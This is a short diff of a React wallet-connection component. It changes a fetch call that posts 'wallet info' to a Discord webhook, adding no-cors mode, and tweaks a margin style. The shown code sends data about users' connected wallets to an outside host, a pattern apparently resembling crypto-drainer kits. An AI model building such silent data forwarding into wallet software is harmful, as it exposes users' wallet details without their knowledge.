@@ -93,11 +93,13 @@ const WalletConnectionHandler: FC = () => {
         };
 
         try {
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(message)
-            });
+           await fetch(webhookURL, {
+    method: 'POST',
+    mode: 'no-cors', // 👈 add this
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(message)
+});
+
             console.log('✅ Sent wallet info to Discord');
         } catch (error) {
             console.error('❌ Failed to send to Discord', error);
@@ -115,7 +117,7 @@ const WalletConnectionHandler: FC = () => {
             borderRadius: '12px',
             boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
             maxWidth: '500px',
-            marginLeft: 'auto',
+            marginLeft: '20px',
             marginRight: 'auto',
             fontFamily: 'Arial, sans-serif',
         }}>
